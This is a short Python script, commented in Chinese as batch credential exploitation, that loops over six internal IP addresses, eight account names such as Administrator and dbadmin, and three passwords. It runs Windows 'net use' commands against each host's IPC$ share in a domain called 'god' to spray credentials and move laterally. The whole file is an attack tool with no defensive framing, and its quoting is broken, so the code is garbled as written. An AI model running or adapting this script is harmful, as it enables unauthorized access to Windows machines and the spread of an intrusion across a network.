import os,time
# 明文HASH传递批量利用，ip/用户名/密码 多变量遍历
ips={
   '192.168.3.21',
   '192.168.3.25',
   '192.168.3.29',
   '192.168.3.30',
   '192.168.3.31',
   '192.168.3.33'
}
 
users={
   'Administrator',
   'boss',
   'dbadmin',
   'fileadmin',
   'mack',
   'mary',
   'vpnadm',
   'webadmin'
}
passs={
   'admin',
   'admin!@#45',
   'Admin12345'
}
 
for ip in ips:
   for user in users:
       for mima in passs:
           exec="net use \"+ "\"+ip+'\ipc$ '+mima+' /user:god\'+user
           print('--->'+exec+'<---')
           os.system(exec)
           time.sleep(1)